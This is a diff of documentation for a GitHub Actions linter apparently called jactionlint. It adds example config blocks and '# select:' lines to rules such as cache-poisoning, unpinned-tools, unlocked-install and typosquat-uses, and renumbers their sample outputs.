 **What is reported.** The rule is [`dangerous-triggers`](#check-dangerous-triggers) with a finer eye: that rule reports the trigger of every workflow, this one reports the jobs that anybody can start. The check of the user is the same as that of [`agentic-actions`](#check-agentic-actions).
 
@@ -7734,6 +7875,7 @@ The rule `cache-poisoning` reports a cache that an attacker can use to get code 
 Example input:
 
 ```yaml
+# select: cache-poisoning
 on:
   push:
     tags: ["v*"]
@@ -7754,12 +7896,19 @@ jobs:
       - run: cargo publish
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  cache-poisoning: error
 ```
-test.yaml:13:15: swatinem/rust-cache restores a cache although the workflow runs on pushed tags, so a poisoned cache entry can end up in the published artifacts. remove this step or set "lookup-only: true", or set "cache-mode: none" on the job [cache-poisoning]
+
+Output:
+
+```
+test.yaml:14:15: swatinem/rust-cache restores a cache although the workflow runs on pushed tags, so a poisoned cache entry can end up in the published artifacts. remove this step or set "lookup-only: true", or set "cache-mode: none" on the job [cache-poisoning]
    |
-13 |       - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
+14 |       - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
    |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -8050,6 +8199,7 @@ The rule `obfuscation` reports constructs that work but hide what they do from t
 Example input:
 
 ```yaml
+# select: obfuscation
 on: push
 
 jobs:
@@ -8064,25 +8214,31 @@ jobs:
       - run: echo '${{ vars[format('NAME_{0}', github.job)] }}'
 ```
 
+Example config:
+
+```yaml
+rules:
+  obfuscation: error
+```
+
 Output:
 
-<!-- Skip update output -->
 ```
-test.yaml:7:15: path of "actions/checkout/./sub@v4" has redundant or empty segments ("//", "." or ".."). write it as "actions/checkout/sub@v4" [obfuscation]
+test.yaml:8:15: path of "actions/checkout/./sub@v4" has redundant or empty segments ("//", "." or ".."). write it as "actions/checkout/sub@v4" [obfuscation]
   |
-7 |       - uses: actions/checkout/./sub@v4
+8 |       - uses: actions/checkout/./sub@v4
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:10:27: format() is called with literal arguments only so its result is the constant "octocat/hello-world". write the string itself [obfuscation]
+test.yaml:11:27: format() is called with literal arguments only so its result is the constant "octocat/hello-world". write the string itself [obfuscation]
    |
-10 |           repository: ${{ format('{0}/{1}', 'octocat', 'hello-world') }}
+11 |           repository: ${{ format('{0}/{1}', 'octocat', 'hello-world') }}
    |                           ^~~~~~~~~~~~~~~~~
-test.yaml:11:24: fromJSON(toJSON(...)) returns its argument unchanged. remove both calls [obfuscation]
+test.yaml:12:24: fromJSON(toJSON(...)) returns its argument unchanged. remove both calls [obfuscation]
    |
-11 |       - run: echo '${{ fromJSON(toJSON('[1]'))[0] }}'
+12 |       - run: echo '${{ fromJSON(toJSON('[1]'))[0] }}'
    |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:12:29: the index is computed, which hides which property is read from tools that look for it. use a literal property name or a matrix to select the value [obfuscation]
+test.yaml:13:29: the index is computed, which hides which property is read from tools that look for it. use a literal property name or a matrix to select the value [obfuscation]
    |
-12 |       - run: echo '${{ vars[format('NAME_{0}', github.job)] }}'
+13 |       - run: echo '${{ vars[format('NAME_{0}', github.job)] }}'
    |                             ^~~~~~~~~~~~~~~~~~
 ```
 
@@ -8167,8 +8323,15 @@ jobs:
       - run: echo hello
 ```
 
+Example config:
+
+```yaml
+rules:
+  unpinned-images: error
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:7:16: container image "node" has no tag, so the registry decides which image is pulled ("latest"). pin it to a digest like "node@sha256:{digest}" [unpinned-images]
   |
@@ -8182,12 +8345,7 @@ test.yaml:11:16: image "postgres:16" of service "db" is pinned by a tag, which c
 
 <!-- Skip playground link -->
 
-The output keeps only the findings of this rule: `jactionlint --select unpinned-images test.yaml` prints the same for a copy of the example. In [the config file](./config.md#rule-levels-and-options) the rule is set like this, at its default level:
-
-```yaml
-rules:
-  unpinned-images: error
-```
+The output keeps only the findings of this rule: `jactionlint --select unpinned-images test.yaml` prints the same for a copy of the example. In [the config file](./config.md#rule-levels-and-options) the rule is set like this, at its default level; the example config of this section is such an entry.
 
 **Fix.** Pin the image with its content digest: `postgres:16@sha256:{64 hex digits}`. Keep the tag next to the digest, so that Dependabot and Renovate can update both. `docker inspect postgres:16 --format='{{index .RepoDigests 0}}'` prints the digest of an image you have pulled. With `--online --fix=unsafe` jactionlint writes the digest for you, see [how the online fix finds a digest](#how-the-online-fix-of-unpinned-images-finds-a-digest).
 
@@ -8314,6 +8472,7 @@ The following example runs with the option and the level `warn`:
 Example input:
 
 ```yaml
+# select: unpinned-tools
 on: push
 jobs:
   tools:
@@ -8324,20 +8483,29 @@ jobs:
       - run: go install golang.org/x/tools/cmd/stringer@latest
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  unpinned-tools:
+    level: warn
+    pedantic: true
 ```
-test.yaml:6:15: warning: action "hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd" installs the newest version of its tool because the input "terraform_version" is not set. set "terraform_version" to an exact version [unpinned-tools]
+
+Output:
+
+```
+test.yaml:7:15: warning: action "hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd" installs the newest version of its tool because the input "terraform_version" is not set. set "terraform_version" to an exact version [unpinned-tools]
   |
-6 |       - uses: hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd # v3.1.2
+7 |       - uses: hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd # v3.1.2
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:7:14: warning: tool "requests" is installed without an exact version, so every run may fetch a different release. pin it with `==`, for example `tool==1.2.3` [unpinned-tools]
+test.yaml:8:14: warning: tool "requests" is installed without an exact version, so every run may fetch a different release. pin it with `==`, for example `tool==1.2.3` [unpinned-tools]
   |
-7 |       - run: pip install requests black==24.3.0
+8 |       - run: pip install requests black==24.3.0
   |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:8:14: warning: tool "golang.org/x/tools/cmd/stringer@latest" is installed without an exact version, so every run may fetch a different release. pin it with a version, for example `tool@v1.2.3` [unpinned-tools]
+test.yaml:9:14: warning: tool "golang.org/x/tools/cmd/stringer@latest" is installed without an exact version, so every run may fetch a different release. pin it with a version, for example `tool@v1.2.3` [unpinned-tools]
   |
-8 |       - run: go install golang.org/x/tools/cmd/stringer@latest
+9 |       - run: go install golang.org/x/tools/cmd/stringer@latest
   |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -8435,6 +8603,7 @@ The following example shows a manifest install and a requirements file with the 
 Example input:
 
 ```yaml
+# select: unlocked-install
 on: push
 jobs:
   test:
@@ -8444,28 +8613,36 @@ jobs:
       - run: pip install -r requirements.txt
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  unlocked-install:
+    pedantic: true
 ```
-test.yaml:6:14: "npm install" resolves the dependencies again and may update the package-lock.json instead of failing when it is out of date. use `npm ci` [unlocked-install]
+
+Output:
+
+```
+test.yaml:7:14: "npm install" resolves the dependencies again and may update the package-lock.json instead of failing when it is out of date. use `npm ci` [unlocked-install]
   |
-6 |       - run: npm install
+7 |       - run: npm install
   |              ^~~~~~~~~~~
-test.yaml:6:14: "npm install" runs the lifecycle scripts (preinstall, install, postinstall) of every dependency, and a compromised release uses them to run code on the runner. pass `--ignore-scripts` or set `ignore-scripts=true` in .npmrc, and run what a package needs with `npm rebuild` [unlocked-install]
+test.yaml:7:14: "npm install" runs the lifecycle scripts (preinstall, install, postinstall) of every dependency, and a compromised release uses them to run code on the runner. pass `--ignore-scripts` or set `ignore-scripts=true` in .npmrc, and run what a package needs with `npm rebuild` [unlocked-install]
   |
-6 |       - run: npm install
+7 |       - run: npm install
   |              ^~~~~~~~~~~
-test.yaml:6:14: "npm install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--min-release-age=7` or set `min-release-age=7` in .npmrc (npm 11.10 and later) [unlocked-install]
+test.yaml:7:14: "npm install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--min-release-age=7` or set `min-release-age=7` in .npmrc (npm 11.10 and later) [unlocked-install]
   |
-6 |       - run: npm install
+7 |       - run: npm install
   |              ^~~~~~~~~~~
-test.yaml:7:14: "pip install -r requirements.txt" installs a requirements file without hashes or constraints, so the transitive dependencies are resolved anew on every run. use a lock file with hashes (`pip-compile --generate-hashes`) and pass --require-hashes, or pin them with -c [unlocked-install]
+test.yaml:8:14: "pip install -r requirements.txt" installs a requirements file without hashes or constraints, so the transitive dependencies are resolved anew on every run. use a lock file with hashes (`pip-compile --generate-hashes`) and pass --require-hashes, or pin them with -c [unlocked-install]
   |
-7 |       - run: pip install -r requirements.txt
+8 |       - run: pip install -r requirements.txt
   |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:7:14: "pip install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--uploaded-prior-to` (pip 26.0 and later; a date, or a duration such as `P7D`), or install with uv and `--exclude-newer` [unlocked-install]
+test.yaml:8:14: "pip install" takes the newest release of every dependency, however new, so a compromised release reaches the workflow before it is found and pulled. pass `--uploaded-prior-to` (pip 26.0 and later; a date, or a duration such as `P7D`), or install with uv and `--exclude-newer` [unlocked-install]
   |
-7 |       - run: pip install -r requirements.txt
+8 |       - run: pip install -r requirements.txt
   |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -8773,8 +8950,16 @@ jobs:
           attestations: false
 ```
 
+Example config:
+
+```yaml
+rules:
+  use-trusted-publishing:
+    pedantic: true
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:12:15: "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI with the OIDC token of the job ("id-token: write"), and the job has no "environment:". tie the trusted publisher to an environment and add it to the job (with required reviewers if you can), so that a run that someone else started cannot publish on its own [use-trusted-publishing]
    |
@@ -8792,13 +8977,7 @@ test.yaml:14:25: action "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe1
 
 <!-- Skip playground link -->
 
-This is the output with the option `pedantic`, set for the rule in [the config file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  use-trusted-publishing:
-    pedantic: true
-```
+This is the output with the option `pedantic`, set for the rule in [the config file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **Related.** zizmor has an audit of the same name; [zizmor parity](./zizmor-parity.md) lists the differences.
 
@@ -8818,8 +8997,15 @@ jobs:
       - uses: action/checkout@v4
 ```
 
+Example config:
+
+```yaml
+rules:
+  typosquat-uses: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:6:15: warning: "action/checkout" looks like a typo of the popular action "actions/checkout", which belongs to another account. a typosquatted account can serve malicious code. check the name; to accept it as is, add "action/checkout" to the "allow" option of the "typosquat-uses" rule [typosquat-uses]
   |
@@ -8830,11 +9016,6 @@ test.yaml:6:15: warning: "action/checkout" looks like a typo of the popular acti
 <!-- Skip playground link -->
 
 The output shows the rule at the level `warn`, which this `rules` section of [the config file](./config.md#rule-levels-and-options) sets. The default level is `error`.
-
-```yaml
-rules:
-  typosquat-uses: warn
-```
 
 **What is reported.** One typo means a character added, removed, replaced or two neighboring characters swapped. The popular actions are the ones in the data set behind [the popular action inputs check](#check-popular-action-inputs). The check compares names only: it does not ask GitHub whether the repository exists.
 
@@ -8868,8 +9049,18 @@ jobs:
       - uses: tj-actions/changed-files@v45
 ```
 
+Example config:
+
+```yaml
+rules:
+  forbidden-uses:
+    allow:
+      - actions/*
+      - github/codeql-action/*
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:7:15: action "tj-actions/changed-files@v45" is not allowed because it matches no pattern in the "allow" list of the "forbidden-uses" rule ("actions/*", "github/codeql-action/*"). use an allowed one or add a pattern to the configuration [forbidden-uses]
   |
@@ -8879,15 +9070,7 @@ test.yaml:7:15: action "tj-actions/changed-files@v45" is not allowed because it 
 
 <!-- Skip playground link -->
 
-The output keeps only the findings of this rule (`--select forbidden-uses` does the same for a copy of the example). It comes from this `rules` section of [the config file](./config.md#rule-levels-and-options), which makes the rule run:
-
-```yaml
-rules:
-  forbidden-uses:
-    allow:
-      - actions/*
-      - github/codeql-action/*
-```
+The output keeps only the findings of this rule (`--select forbidden-uses` does the same for a copy of the example). It comes from the `rules` section of the example config, which is an entry of [the config file](./config.md#rule-levels-and-options), which makes the rule run.
 
 **Patterns.** Both options are lists of patterns. A pattern is `owner/repo[/path]`, optionally followed by `@ref`; names are case-insensitive and refs are case-sensitive:
 
@@ -9294,16 +9477,10 @@ The example output has a second finding, of `outdated-action-runner`: that rule 
 
 The rules `require-shell` and `max-run-lines` (both in the `pedantic` profile, level `error`) report a `run:` step that does not set its shell explicitly and a `run:` script that is longer than you allow. They are off unless you choose that profile. To enable them alone, set them in the [configuration file](./config.md#rule-levels-and-options):
 
-```yaml
-rules:
-  require-shell: error
-  max-run-lines:
-    max: 3
-```
-
 Example input:
 
 ```yaml
+# select: require-shell,max-run-lines
 on: push
 jobs:
   test:
@@ -9331,17 +9508,25 @@ jobs:
       - run: echo hello
 ```
 
+Example config:
+
+```yaml
+rules:
+  require-shell: error
+  max-run-lines:
+    max: 3
+```
+
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:7:9: shell is not set explicitly. set "shell:" at the step or "defaults.run.shell" because "require-shell" is enabled [require-shell]
+test.yaml:8:9: shell is not set explicitly. set "shell:" at the step or "defaults.run.shell" because "require-shell" is enabled [require-shell]
   |
-7 |       - run: echo hello
+8 |       - run: echo hello
   |         ^~~~
-test.yaml:12:14: script in "run:" has 4 lines but at most 3 lines are allowed because "max-run-lines" is set. consider moving it to a script file or an action [max-run-lines]
+test.yaml:13:14: script in "run:" has 4 lines but at most 3 lines are allowed because "max-run-lines" is set. consider moving it to a script file or an action [max-run-lines]
    |
-12 |       - run: |
+13 |       - run: |
    |              ^
 ```
 
@@ -9369,8 +9554,15 @@ jobs:
       - run: make
 ```
 
+Example config:
+
+```yaml
+rules:
+  anonymous-definition: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:1:1: warning: workflow has no "name:", so GitHub shows its file path in the Actions UI. add a top-level "name:" to make the workflow recognizable [anonymous-definition]
   |
@@ -9384,12 +9576,7 @@ test.yaml:3:3: warning: job "build" has no "name:", so the Actions UI shows only
 
 <!-- Skip playground link -->
 
-The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=anonymous-definition`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options):
-
-```yaml
-rules:
-  anonymous-definition: warn
-```
+The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=anonymous-definition`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.
 
 **What is not reported.** Jobs that call a reusable workflow, since GitHub shows them as `caller / called job`. The workflow `.github/workflows/copilot-setup-steps.yml`, which GitHub runs when the Copilot coding agent starts, is not reported either.
 
@@ -9403,14 +9590,10 @@ rules:
 
 The rule `unused-ignore` (in the `pedantic` profile, level `error`) reports an ignore that did not suppress a finding: a `# jactionlint ignore=...` comment or an entry of `ignores` in the [configuration file](./config.md#durable-ignores). An ignore outlives the code it was written for: the finding was fixed, the line moved, or the rule ID was mistyped. What remains hides nothing and misleads the reader, and it would hide a new finding at the same place. To enable the rule alone, set it in the configuration file:
 
-```yaml
-rules:
-  unused-ignore: error
-```
-
 Example input:
 
 ```yaml
+# select: shellcheck,unused-ignore
 on: push
 jobs:
   test:
@@ -9422,17 +9605,23 @@ jobs:
       - run: echo bye
 ```
 
+Example config:
+
+```yaml
+rules:
+  unused-ignore: error
+```
+
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:6:28: ignore pattern "shellcheck" did not suppress any error. remove it [unused-ignore]
+test.yaml:7:28: ignore pattern "shellcheck" did not suppress any error. remove it [unused-ignore]
   |
-6 |       # jactionlint ignore=shellcheck
+7 |       # jactionlint ignore=shellcheck
   |                            ^~~~~~~~~~
-test.yaml:8:28: ignore pattern "no-such-rule" did not suppress any error. remove it [unused-ignore]
+test.yaml:9:28: ignore pattern "no-such-rule" did not suppress any error. remove it [unused-ignore]
   |
-8 |       # jactionlint ignore=no-such-rule
+9 |       # jactionlint ignore=no-such-rule
   |                            ^~~~~~~~~~~~
 ```
 
@@ -9639,6 +9828,8 @@ The rule is in the `pedantic` profile, at the level `warn`. It is a policy of ja
 Example input:
 
 ```yaml
+# select: dependabot-missing-actions-update
+# profile: pedantic
 version: 2
 updates:
   # ERROR: the workflows of the repository use actions but nothing updates them
@@ -9650,12 +9841,23 @@ updates:
       default-days: 7
 ```
 
-Output:
-<!-- Skip update output -->
+Example file: .github/workflows/ci.yml
+
+```yaml
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
 ```
-.github/dependabot.yml:1:1: warning: this repository uses actions in its workflows but no update has the "github-actions" package ecosystem, so Dependabot never updates them. add an update with "package-ecosystem: github-actions" and "directory: /" [dependabot-missing-actions-update]
+
+Output:
+
+```
+.github/dependabot.yml:3:1: warning: this repository uses actions in its workflows but no update has the "github-actions" package ecosystem, so Dependabot never updates them. add an update with "package-ecosystem: github-actions" and "directory: /" [dependabot-missing-actions-update]
   |
-1 | version: 2
+3 | version: 2
   | ^~~~~~~~
 ```
 
